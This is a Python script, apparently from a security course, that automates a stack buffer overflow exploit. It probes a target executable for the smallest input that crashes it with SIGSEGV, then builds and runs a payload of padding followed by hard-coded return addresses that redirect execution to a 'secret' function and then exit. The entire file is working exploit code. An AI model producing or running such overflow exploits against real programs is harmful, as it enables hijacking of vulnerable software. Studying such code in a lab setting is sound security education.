#!/usr/bin/env python3

"""
"""

# ------------------------------- MODULE INFO ---------------------------------
__all__ = ["buffer_exploit"]
# ------------------------------- MODULE INFO ---------------------------------

# --------------------------------- MODULES -----------------------------------
import argparse
import shutil
import signal
import subprocess
# --------------------------------- MODULES -----------------------------------

# ------------------------------ TYPE ALIASES ---------------------------------
# ------------------------------ TYPE ALIASES ---------------------------------


# -------------------------------- FUNCTIONS ----------------------------------
def buffer_exploit(program: str, output: str):
    """
    Find the minimum number of letters that can cause a buffer overflow and
    write the appropriate attack byte content into a file named 'output'.
    """

    if not all(isinstance(arg, str) for arg in (program, output)):
        raise TypeError("'program' and 'output' must be of 'str' type")

    if not shutil.which(program):
        raise ValueError("The given 'program' is not found")

    buffer_size = None
    buffer_found = False
    high = 1
    padding_byte = b"0"
    secret_byte = b"\x24\x82\x04\x08"
    exit_byte = b"\xfc\x0d\x05\x08"
    low = None
    high_found = False
    output_info = "The minimum number of letters that caused overflow is: {0}"

    while not high_found:
        with subprocess.Popen([program], stdin=subprocess.PIPE) as proc:
            proc.communicate(padding_byte * high)
            # iteratively double 'high' as long as no 'SIGSEGV' signal
            # is delivered
            if proc.returncode == -signal.SIGSEGV:
                high_found = True
            else:
                high *= 2

    low = high // 2
    buffer_size = (low + high) // 2

    while not buffer_found:
        with subprocess.Popen([program], stdin=subprocess.PIPE) as proc1:
            proc1.communicate(padding_byte * buffer_size)

        # if the program crashes with SIGSEGV signal
        if proc1.returncode == -signal.SIGSEGV:

            # need to test whether buffer_size - 1 still cause a crash
            with subprocess.Popen([program], stdin=subprocess.PIPE) as proc2:
                proc2.communicate(padding_byte * (buffer_size - 1))

            # if it still crashes, set 'high' to be 'buffer_size'
            if proc2.returncode == -signal.SIGSEGV:
                high = buffer_size - 1
            # otherwise we have found the minimum 'buffer_size' that
            # cause a crash
            else:
                buffer_found = True
        else:
            low = buffer_size + 1

        buffer_size = (low + high) // 2

    print(output_info.format(buffer_size))

    with open(output, "wb") as dump:
        dump.write(padding_byte * buffer_size + secret_byte + exit_byte)

    with subprocess.Popen([program], stdin=subprocess.PIPE) as proc:
        proc.communicate(padding_byte * buffer_size + secret_byte + exit_byte)


def main():
    """
    Main command line driver.
    """

    parser = argparse.ArgumentParser()
    attr_desc_dict = {
        "executable": "path to the 'weak' executable",
        "output": "file to store the binary content used for attacking"
    }

    for flag, msg in attr_desc_dict.items():
        parser.add_argument("-" + flag[0],
                            "--" + flag,
                            type=str,
                            required=False,
                            help=msg)

    args = parser.parse_args()
    arg_list = None

    if all(getattr(args, attr) for attr in attr_desc_dict):
        arg_list = [getattr(args, attr) for attr in sorted(attr_desc_dict)]
        buffer_exploit(*arg_list)

# -------------------------------- FUNCTIONS ----------------------------------


if __name__ == "__main__":
    main()
